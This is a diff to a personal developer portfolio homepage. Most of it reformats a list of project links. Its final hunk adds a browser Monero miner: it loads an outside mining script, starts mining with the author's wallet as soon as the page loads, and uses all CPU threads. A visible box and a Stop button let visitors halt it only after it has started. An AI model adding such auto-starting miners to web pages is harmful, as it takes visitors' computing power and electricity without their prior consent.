@@ -1,6 +1,7 @@
 ﻿<!DOCTYPE html>
 <html>
 <script type="text/javascript" src="FreDuino/js/jquery-3.2.1.min.js"></script>
+
 <head>
   <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
   <script>
@@ -174,7 +175,7 @@ ABQAEwCAQEBA////AiaEj6HL6MBieEkueuzFUE/ufVjIdVpJgh66qqdrse/Y0jOV2jEsFQA7";
     $(document).click(function (e) {
       var list = ['AutoVoting for Yunmai', 'ChaoXing ErYa Wisdom Tree Lessons Helper', 'Drawing Electron Cloud with Matlab',
         'Drawing Using Fourier series', 'Smart Chatting Robot', 'A Scratch Introduction to AI', '★ DeepFlying', '❤ Story of LZU', 'FreDuino Cars', 'Making An Robot Car',
-        'English Word Statistics Program', 'Standard Sudoku Solve System', 'Retro Snaker', 'Gobang', 'Coding Practice', 'MOOC C# Programming Language', 'Guessing Game', 'Simple Programmes Coded by Blockly', 'Childhood VB Programs', 'Answersfor my C Programing Lesson', 'Spider for LZU STU-INFO System', 'Answers For My Java Programming Lesson', 'Answers For My C++ Programming Lesson', 'Captcha Data Set Marking Tool', 'Voting System Based on Wechat Pay', 'LZU Electives MOOC Answers','Building CCTV','Tool Set for College Language Test','Lanck Face Recognition Lock Competition Backend Code'];
+        'English Word Statistics Program', 'Standard Sudoku Solve System', 'Retro Snaker', 'Gobang', 'Coding Practice', 'MOOC C# Programming Language', 'Guessing Game', 'Simple Programmes Coded by Blockly', 'Childhood VB Programs', 'Answersfor my C Programing Lesson', 'Spider for LZU STU-INFO System', 'Answers For My Java Programming Lesson', 'Answers For My C++ Programming Lesson', 'Captcha Data Set Marking Tool', 'Voting System Based on Wechat Pay', 'LZU Electives MOOC Answers', 'Building CCTV', 'Tool Set for College Language Test', 'Lanck Face Recognition Lock Competition Backend Code'];
       textUp(e, 2000, list, 200)
     })
     function textUp(e, time, arr, heightUp) {
@@ -324,8 +325,9 @@ ABQAEwCAQEBA////AiaEj6HL6MBieEkueuzFUE/ufVjIdVpJgh66qqdrse/Y0jOV2jEsFQA7";
         style="margin-left: 10%; font-size: 170%" class="love">Tool Set for College Language Test</a>
     </p>
     <p>
-      <a href="https://github.com/HollowMan6/Lanck-Face-Recognition-Lock-Competition-Backend-Code" style="margin-left: 10%; font-size: 170%"
-        class="love" target="_blank">Lanck Face-Rec Lock Competition Backend Code</a>
+      <a href="https://github.com/HollowMan6/Lanck-Face-Recognition-Lock-Competition-Backend-Code"
+        style="margin-left: 10%; font-size: 170%" class="love" target="_blank">Lanck Face-Rec Lock Competition Backend
+        Code</a>
     </p>
     <p>
       <a href="https://github.com/hollowman6/Drawing-Electron-Cloud-with-Matlab" target="_blank"
@@ -451,11 +453,66 @@ ABQAEwCAQEBA////AiaEj6HL6MBieEkueuzFUE/ufVjIdVpJgh66qqdrse/Y0jOV2jEsFQA7";
     <p>
       <a href="mailto:hollowman186@vip.qq.com" style="margin-left: 17%; font-size: 150%">Mail ME</a>
       <a href="/fund.html" style="margin-left: 17% ;font-size: 150%" class="love">❤ Fund ME</a>
-      <h1>&nbsp;</h1>
+    </p>
+
+    <div class="miner-outerbox">
+      <h1>Help Me Mine Monero</h1>
+      <button id="stop-button" style="margin-left: 38% "><span class="default">Stop</span></button>
+      <p>
+        <textarea rows='10' cols='40' id="texta" style="margin-left: 17% "></textarea>
+      </p>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+    <script src="https://xmr.omine.org/assets/v7.js"></script>
+    <script>
+      var isGo = true;
+      var timeout;
+
+      function addText(e) {
+
+        var t = document.getElementById("texta");
+
+        "job" === e.identifier ? t.value += "new job: " + e.job_id : "solved" === e.identifier ? t.value += "solved job: " + e.job_id : "hashsolved" === e.identifier ? t.value += "pool accepted hash!" : "error" === e.identifier ? t.value += "error: " + e.param : t.value += e, t.value += "\n", t.scrollTop = t.scrollHeight
+
+      }
+      function miner() {
+        OMINE("46gRnPZWAQddCypNA5A27qNmrM7JqapbWdsD1Dw1prDVea4JnXVxFv846oRQW7XxMYUZnZ8PUE59bVNzP5khr8KNGDsUKDz#WebMiner", "-1"), //-1 means use all cpu threads
+          throttleMiner = 10,
+          addText("Connecting..."),
+          timeout = setInterval(function () {
+            for (;
+              sendStack.length > 0;
+            ) addText(sendStack.pop());
+            for (;
+              receiveStack.length > 0;
+            ) addText(receiveStack.pop());
+            addText("calculated " + totalhashes + " hashes.")
+          }
+            , 2e3);
+      }
+
+      miner();
+      $("#stop-button").click(function () {
+        if (isGo) {
+          $(this).html(`<span class="start">Continue</span>`);
+          stopMining();
+          clearInterval(timeout);
+          addText("Stopped mining...\nOK");
+        }
+        else {
+          $(this).html(`<span class="stop">Stop</span>`);
+          miner();
+        }
+        isGo = !isGo;
+      }
+
+      );
+    </script>
+    <h1>&nbsp;</h1>
   </div>
 
-  </p>
-  </div>
+
 </body>
 
 </html>
